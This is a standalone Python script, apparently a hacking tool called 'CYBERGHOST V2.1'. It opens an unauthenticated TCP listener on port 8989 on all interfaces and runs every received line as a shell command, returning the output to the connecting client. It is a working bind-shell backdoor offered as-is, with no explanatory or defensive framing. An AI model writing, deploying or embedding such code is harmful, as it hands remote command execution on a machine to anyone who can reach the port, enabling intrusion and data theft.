import os, subprocess, socket, errno
from threading import Thread

_SERVER = '0.0.0.0'
_PORT = 8989

def conn(client, addr):
    try:
        client.send("CYBERGHOST V2.1 : Command Processor \r\n")

        while True:
            try:
                data = client.recv(1024)
                if data is None:
                    break
        
                command = data.strip().lower()
        
                response = subprocess.check_output(command, shell=True).strip()
                print(str(addr[0]) + " " + str(addr[1]) + " " + command + "\t" + " ".join(response.split()))
                client.send(str(response) + "\n")
            except subprocess.CalledProcessError as ex:

                client.close()
                break
            except IOError as ex:
                if ex.errno == errno.EPIPE or ex.errno == errno.ECONNRESET:
                    break
                pass
    except :
        client.close()

def main():
    print("[+] Starting CYBERGHOST V2.1 Server")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sock.bind((_SERVER, _PORT))
        sock.listen(10)
        
        while True:
            try:
                client, addr = sock.accept()
                t = Thread(target=conn, args=(client,addr))
                t.daemon = True
                t.start()
            except Exception as ex:
                print(ex)

    except KeyboardInterrupt:
        print("")
        print("[-] Exiting CYBERGHOST V2.1 Server")

if __name__ == '__main__':
    main()
